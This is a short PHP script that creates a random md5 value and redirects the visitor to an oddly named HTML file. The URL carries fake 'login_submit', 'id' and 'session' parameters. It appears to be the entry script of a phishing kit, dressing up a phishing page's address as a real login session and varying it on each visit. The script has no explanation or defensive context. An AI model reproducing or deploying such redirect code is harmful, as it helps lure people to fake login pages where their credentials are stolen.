<?php
	
	$praga=rand();
	$praga=md5($praga);

	header("location: sf8743rg387efg9823983.html?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>